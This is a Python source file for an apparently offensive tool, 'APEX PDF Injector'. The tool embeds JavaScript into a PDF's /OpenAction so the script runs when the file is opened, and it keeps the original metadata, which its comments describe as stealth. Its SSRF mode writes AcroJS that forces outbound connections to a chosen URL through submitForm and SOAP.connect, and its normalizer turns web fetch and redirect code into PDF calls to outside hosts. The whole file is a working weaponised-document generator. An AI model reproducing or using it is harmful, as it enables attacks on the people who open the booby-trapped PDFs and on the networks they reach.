import sys
import os
import re
import argparse
from pypdf import PdfReader, PdfWriter

class PayloadEngine:
    """
    Intelligent engine that creates PDF-compatible payloads.
    It distinguishes between raw web JS and specific AcroJS.
    """
    
    @staticmethod
    def generate_ssrf_payload(url: str) -> str:
        """
        Generates a 'Poly-Protocol' SSRF payload. 
        It attempts multiple methods to force an outbound connection.
        """
        print(f"[*] Mode: Poly-Protocol SSRF Generator")
        print(f"[*] Target: {url}")
        
        # We use a try/catch block for EACH method so one failure doesn't stop the others.
        payload = (
            f"var targetURL = '{url}';\n"
            f"app.alert('Apex: Firing SSRF packets...');\n"
            
            # Method 1: submitForm (FDF) - The Standard
            # 'FDF' is lighter than 'PDF' and looks like standard form data.
            f"try {{\n"
            f"    this.submitForm({{\n"
            f"        cURL: targetURL + '?req=fdf',\n"
            f"        cSubmitAs: 'FDF',\n" 
            f"        cCharSet: 'utf-8'\n"
            f"    }});\n"
            f"}} catch(e) {{ console.println('FDF failed: ' + e); }}\n"

            # Method 2: submitForm (HTML) - The Backup
            # Behaving like a standard browser form POST
            f"try {{\n"
            f"    this.submitForm({{\n"
            f"        cURL: targetURL + '?req=html',\n"
            f"        cSubmitAs: 'HTML'\n"
            f"    }});\n"
            f"}} catch(e) {{ console.println('HTML failed: ' + e); }}\n"

            # Method 3: SOAP.connect - The Bypass
            # Often bypasses restrictions that block submitForm
            f"try {{\n"
            f"    SOAP.connect(targetURL + '?req=soap');\n"
            f"}} catch(e) {{ console.println('SOAP failed: ' + e); }}\n"
        )
        return payload

    @staticmethod
    def normalize_script(raw_content: str) -> str:
        """
        Analyzes input script and converts Web JS to AcroJS if necessary.
        """
        # 1. Detection: Is this already AcroJS?
        # We look for specific PDF API keywords.
        acro_indicators = ["app.alert", "this.submitForm", "app.launchURL", "util.printd", "SOAP.connect"]
        if any(indicator in raw_content for indicator in acro_indicators):
            print("[*] Payload Analysis: Valid AcroJS detected. Using payload directly.")
            return raw_content

        print("[*] Payload Analysis: Standard Web JS detected. Translating to AcroJS...")
        converted = raw_content

        # 2. Translation: alert() -> app.alert()
        # Matches 'alert(' but NOT 'app.alert('
        pattern_alert = r'(?<!app\.)alert\s*\('
        if re.search(pattern_alert, converted):
            converted = re.sub(pattern_alert, 'app.alert(', converted)
            print("    -> Converted 'alert()' to 'app.alert()'")

        # 3. Translation: fetch/xhr -> submitForm (SSRF)
        # Matches fetch('url') or fetch("url")
        pattern_fetch = r"fetch\s*\(['\"](https?://.*?)['\"]\)"
        match_fetch = re.search(pattern_fetch, converted)
        
        if match_fetch:
            target_url = match_fetch.group(1)
            print(f"    -> Converted 'fetch' to 'this.submitForm' (Target: {target_url})")
            # Replace the entire fetch line with the submitForm logic
            replacement = (
                f"this.submitForm{{cURL: '{target_url}', cSubmitAs: 'PDF'}};"
            )
            converted = re.sub(pattern_fetch, replacement, converted)

        # 4. Translation: window.location -> app.launchURL (Open Redirect)
        if "window.location" in converted or "document.location" in converted:
             # Basic extraction of the assigned URL if present, else just a warning
             pattern_loc = r"=\s*['\"](https?://.*?)['\"]"
             match_loc = re.search(pattern_loc, converted)
             if match_loc:
                 url = match_loc.group(1)
                 print(f"    -> Converted 'window.location' to 'app.launchURL' (Target: {url})")
                 converted = re.sub(r"window\.location\s*=\s*['\"].*?['\"]", f"app.launchURL('{url}', true)", converted)
                 converted = re.sub(r"document\.location\s*=\s*['\"].*?['\"]", f"app.launchURL('{url}', true)", converted)

        return converted

class PDFInjector:
    def __init__(self, input_path, output_path):
        self.input_path = input_path
        self.output_path = output_path

    def inject(self, payload_script):
        try:
            if not os.path.exists(self.input_path):
                raise FileNotFoundError(f"Input file not found: {self.input_path}")

            reader = PdfReader(self.input_path)
            writer = PdfWriter()

            # Rebuild PDF structure to avoid corruption
            print(f"[*] Reading source: {self.input_path}")
            writer.append_pages_from_reader(reader)

            # Preserve metadata (stealth)
            if reader.metadata:
                writer.add_metadata(reader.metadata)

            # Inject Payload into /OpenAction
            # This ensures execution immediately when the PDF is opened
            print(f"[*] Injecting payload into /OpenAction dictionary...")
            writer.add_js(payload_script)

            # Save
            with open(self.output_path, "wb") as f_out:
                writer.write(f_out)
            
            print(f"[+] Success! Artifact generated: {self.output_path}")

        except Exception as e:
            print(f"[-] Critical Error: {str(e)}")
            sys.exit(1)

def main():
    banner = """
    APEX PDF INJECTOR | Professional Grade
    --------------------------------------
    """
    print(banner)
    
    parser = argparse.ArgumentParser(description="Inject payloads into PDF /OpenAction")
    
    # Required Arguments
    parser.add_argument("-i", "--input", required=True, help="Clean input PDF file")
    parser.add_argument("-o", "--output", required=True, help="Output filename for malicious PDF")
    
    # Mutually Exclusive: Either a file payload OR a direct SSRF URL
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-p", "--payload", help="Path to text file containing JS payload")
    group.add_argument("--ssrf", help="Quick Mode: URL to test for SSRF (Generates payload automatically)")

    args = parser.parse_args()

    # Determine Payload
    final_payload = ""

    if args.ssrf:
        # User wants quick SSRF test
        final_payload = PayloadEngine.generate_ssrf_payload(args.ssrf)
    
    elif args.payload:
        # User provided a file
        if not os.path.exists(args.payload):
            print(f"[-] Error: Payload file '{args.payload}' not found.")
            sys.exit(1)
            
        with open(args.payload, "r") as f:
            raw_content = f.read()
            # Pass through the intelligent normalizer
            final_payload = PayloadEngine.normalize_script(raw_content)

    # Execute Injection
    injector = PDFInjector(args.input, args.output)
    injector.inject(final_payload)

if __name__ == "__main__":
    main()
